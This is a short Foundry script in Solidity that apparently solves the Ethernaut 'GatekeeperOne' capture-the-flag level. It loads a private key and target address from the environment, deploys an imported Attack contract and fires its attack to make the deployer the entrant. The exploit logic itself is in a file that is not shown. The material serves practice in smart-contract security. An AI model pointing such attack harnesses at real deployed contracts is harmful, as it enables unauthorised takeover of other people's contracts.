// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import {GatekeeperOne} from "../src/GatekeeperOne.sol";
import {Attack} from "../src/Attack.sol";

contract CounterScript is Script {
    function run() public {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address deployer = vm.rememberKey(deployerPrivateKey);

        vm.startBroadcast(deployer);

        GatekeeperOne gatekeeperOne = GatekeeperOne(vm.envAddress("GATEKEEPER_ONE"));
        Attack attack = new Attack(gatekeeperOne);
        attack.attack{gas: 3_000_000}();
        assert(gatekeeperOne.entrant() == deployer);

        vm.stopBroadcast();
    }
}
